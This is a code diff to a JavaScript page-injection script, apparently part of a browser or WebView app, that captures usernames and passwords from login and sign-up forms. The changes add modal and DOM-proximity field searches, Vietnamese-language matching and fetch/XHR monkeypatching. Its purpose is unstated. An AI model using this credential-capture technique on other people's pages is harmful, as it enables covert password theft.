@@ -130,14 +130,28 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
 
           pendingPassword = el.value || '';
 
-          // Tìm ô tài khoản trong cùng form hoặc lân cận
+          pendingPassword = el.value || '';
+
+          // Tìm ô tài khoản trong cùng form, modal hoặc lân cận
           var form = el.closest ? el.closest('form') : null;
-          var userInput = form
-            ? form.querySelector('input[type="email"], input[type="text"], input[type="tel"], input[name*="user" i], input[name*="login" i], input[name*="account" i], input[name*="phone" i], input[autocomplete="username"], input[autocomplete="email"]')
+          var container = form || (el.closest ? el.closest('dialog, [role="dialog"], .modal, .modal-content, .popup, .login-box, .auth-box, section, div[class*="modal" i], div[class*="login" i], div[class*="auth" i], div[class*="popup" i], div[class*="card" i]') : null) || (el.parentElement ? el.parentElement.parentElement : null) || document;
+
+          var userInput = container
+            ? container.querySelector('input[autocomplete="username"], input[autocomplete="email"], input[type="email"], input[placeholder*="tài khoản" i], input[placeholder*="đăng nhập" i], input[placeholder*="tai khoan" i], input[placeholder*="dang nhap" i], input[placeholder*="username" i], input[placeholder*="email" i], input[name*="user" i], input[name*="login" i], input[name*="account" i], input[name*="email" i], input[type="text"], input[type="tel"]')
             : null;
 
           if (!userInput) {
-            userInput = document.querySelector('input[autocomplete="username"], input[autocomplete="email"], input[name*="user" i], input[name*="login" i]');
+            // Lấy input text/email nằm ngay trước ô password trong cây DOM
+            var allInputs = Array.from(document.querySelectorAll('input:not([type="hidden"]):not([type="password"])'));
+            for (var i = allInputs.length - 1; i >= 0; i--) {
+              var inp = allInputs[i];
+              if (inp.compareDocumentPosition(el) & Node.DOCUMENT_POSITION_FOLLOWING) {
+                if (inp.value && !isSearchOrIrrelevantField(inp) && !isOtpOrNonPasswordField(inp)) {
+                  userInput = inp;
+                  break;
+                }
+              }
+            }
           }
 
           if (userInput && userInput.value && !isOtpOrNonPasswordField(userInput) && !isSearchOrIrrelevantField(userInput)) {
@@ -145,7 +159,7 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
           }
         } else if (el.type === 'email' || el.type === 'text' || el.type === 'tel') {
           if (isSearchOrIrrelevantField(el) || isOtpOrNonPasswordField(el)) return;
-          var tag = (el.name || el.id || el.getAttribute('autocomplete') || '').toLowerCase();
+          var tag = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' + (el.getAttribute('autocomplete') || '') + ' ' + (el.getAttribute('aria-label') || '')).toLowerCase();
           if (
             el.type === 'email' ||
             el.type === 'tel' ||
@@ -153,7 +167,13 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
             tag.includes('login') ||
             tag.includes('email') ||
             tag.includes('account') ||
-            tag.includes('phone')
+            tag.includes('phone') ||
+            tag.includes('tài khoản') ||
+            tag.includes('tai khoan') ||
+            tag.includes('đăng nhập') ||
+            tag.includes('dang nhap') ||
+            tag.includes('tên') ||
+            tag.includes('ten')
           ) {
             pendingUsername = (el.value || '').trim();
           }
@@ -203,6 +223,12 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
         if (form) {
           pwdInput = form.querySelector('input[type="password"]');
         }
+        if (!pwdInput && sourceEl && sourceEl.closest) {
+          var modalBox = sourceEl.closest('dialog, [role="dialog"], .modal, .modal-content, .popup, .login-box, .auth-box, section, div[class*="modal" i], div[class*="login" i], div[class*="auth" i], div[class*="popup" i]');
+          if (modalBox) {
+            pwdInput = modalBox.querySelector('input[type="password"]');
+          }
+        }
         if (!pwdInput) {
           pwdInput = document.querySelector('input[type="password"]');
         }
@@ -215,18 +241,35 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
           }
         }
 
-        if (form) {
-          var userInput = form.querySelector('input[autocomplete="username"], input[autocomplete="email"], input[type="email"], input[type="text"], input[type="tel"], input[name*="user" i], input[name*="login" i]');
-          if (userInput && userInput.value && !isOtpOrNonPasswordField(userInput) && !isSearchOrIrrelevantField(userInput)) {
-            userVal = userInput.value.trim();
+        // Tìm username trong container modal/form hoặc lân cận
+        var container = form || (sourceEl && sourceEl.closest ? sourceEl.closest('dialog, [role="dialog"], .modal, .modal-content, .popup, .login-box, .auth-box, section, div[class*="modal" i], div[class*="login" i], div[class*="auth" i], div[class*="popup" i]') : null) || (pwdInput && pwdInput.parentElement ? pwdInput.parentElement.parentElement : null) || document;
+
+        var userInput = container.querySelector(
+          'input[autocomplete="username"], input[autocomplete="email"], input[type="email"], input[placeholder*="tài khoản" i], input[placeholder*="đăng nhập" i], input[placeholder*="tai khoan" i], input[placeholder*="dang nhap" i], input[placeholder*="username" i], input[placeholder*="email" i], input[name*="user" i], input[name*="login" i], input[name*="account" i], input[name*="email" i], input[type="text"], input[type="tel"]'
+        );
+
+        if ((!userInput || !userInput.value) && pwdInput) {
+          var allInputs = Array.from(document.querySelectorAll('input:not([type="hidden"]):not([type="password"])'));
+          for (var i = allInputs.length - 1; i >= 0; i--) {
+            var inp = allInputs[i];
+            if (inp.compareDocumentPosition(pwdInput) & Node.DOCUMENT_POSITION_FOLLOWING) {
+              if (inp.value && !isSearchOrIrrelevantField(inp) && !isOtpOrNonPasswordField(inp)) {
+                userInput = inp;
+                break;
+              }
+            }
           }
+        }
+
+        if (userInput && userInput.value && !isOtpOrNonPasswordField(userInput) && !isSearchOrIrrelevantField(userInput)) {
+          userVal = userInput.value.trim();
         }
 
         // ĐIỀU KIỆN TIÊN QUYẾT:
         // 1. Phải có username thực tế (độ dài >= 3 ký tự, không chấp nhận rỗng hay từ khóa rác)
         if (!userVal || userVal.length < 3) return;
         var lowerUser = userVal.toLowerCase();
-        if (lowerUser === 'tài khoản' || lowerUser === 'tai khoan' || lowerUser === 'admin' || lowerUser === 'undefined' || lowerUser === 'null') {
+        if (lowerUser === 'undefined' || lowerUser === 'null') {
           return;
         }
 
@@ -249,7 +292,7 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
         }
 
         var isNewPass = false;
-        if (pwdInput && (pwdInput.getAttribute('autocomplete') === 'new-password' || (form && form.querySelectorAll('input[type="password"]').length >= 2))) {
+        if (pwdInput && (pwdInput.getAttribute('autocomplete') === 'new-password' || (container && container.querySelectorAll('input[type="password"]').length >= 2))) {
           isNewPass = true;
         }
 
@@ -276,9 +319,9 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
       triggerDetectedLogin(e.target);
     }, true);
 
-    // 4. Bắt sự kiện Click nút Đăng nhập
+    // 4. Bắt sự kiện Click nút Đăng nhập / Đăng ký
     document.addEventListener('click', function(e) {
-      var btn = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"], a') : null;
+      var btn = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"], a, div[class*="btn" i], span[class*="btn" i]') : null;
       if (btn) {
         var btnText = (btn.innerText || btn.value || '').toLowerCase();
         // Không bắt các nút gửi lại OTP hay hủy
@@ -289,18 +332,38 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
         var isSubmitType = btn.type === 'submit' || (btn.getAttribute && btn.getAttribute('type') === 'submit');
         var hasLoginKeyword =
           btnText.includes('đăng nhập') ||
+          btnText.includes('dang nhap') ||
+          btnText.includes('đăng ký') ||
+          btnText.includes('dang ky') ||
+          btnText.includes('tạo tài khoản') ||
+          btnText.includes('tao tai khoan') ||
           btnText.includes('login') ||
-          btnText.includes('sign in') ||
           btnText.includes('log in') ||
+          btnText.includes('sign in') ||
+          btnText.includes('signin') ||
+          btnText.includes('sign up') ||
+          btnText.includes('signup') ||
+          btnText.includes('register') ||
+          btnText.includes('create account') ||
           btnText.includes('tiếp tục') ||
           btnText.includes('tiếp theo') ||
           btnText.includes('continue') ||
-          btnText.includes('submit');
+          btnText.includes('submit') ||
+          btnText.includes('xác nhận') ||
+          btnText.includes('hoàn tất');
 
         var pwdOnPage = document.querySelector('input[type="password"]');
+        var isNearPassword = false;
+        if (pwdOnPage && btn.closest) {
+          var sharedParent = btn.closest('form, dialog, [role="dialog"], .modal, .modal-content, .popup, .login-box, .auth-box, section, div[class*="modal" i], div[class*="login" i], div[class*="auth" i]');
+          if (sharedParent && sharedParent.contains(pwdOnPage)) {
+            isNearPassword = true;
+          }
+        }
+
         var hasPasswordFilled = Boolean(pendingPassword || (pwdOnPage && pwdOnPage.value && !isOtpOrNonPasswordField(pwdOnPage)));
 
-        if ((isSubmitType || hasLoginKeyword) && hasPasswordFilled) {
+        if ((isSubmitType || hasLoginKeyword || isNearPassword) && hasPasswordFilled) {
           triggerDetectedLogin(btn);
         }
       }
@@ -319,7 +382,31 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
       }
     }, true);
 
-    // 6. Bắt sự kiện chuyển trang sau khi login
+    // 6. Hook XMLHttpRequest & Fetch để bắt đăng nhập / đăng ký qua AJAX trong Single Page App (SPA)
+    try {
+      var origFetch = window.fetch;
+      if (origFetch) {
+        window.fetch = function() {
+          var pwdOnPage = document.querySelector('input[type="password"]');
+          if (pendingPassword || (pwdOnPage && pwdOnPage.value && !isOtpOrNonPasswordField(pwdOnPage))) {
+            triggerDetectedLogin(null);
+          }
+          return origFetch.apply(this, arguments);
+        };
+      }
+      var origXhrSend = XMLHttpRequest.prototype.send;
+      if (origXhrSend) {
+        XMLHttpRequest.prototype.send = function() {
+          var pwdOnPage = document.querySelector('input[type="password"]');
+          if (pendingPassword || (pwdOnPage && pwdOnPage.value && !isOtpOrNonPasswordField(pwdOnPage))) {
+            triggerDetectedLogin(null);
+          }
+          return origXhrSend.apply(this, arguments);
+        };
+      }
+    } catch(e) {}
+
+    // 7. Bắt sự kiện chuyển trang sau khi login
     window.addEventListener('beforeunload', function() {
       if (pendingPassword) {
         triggerDetectedLogin(null);
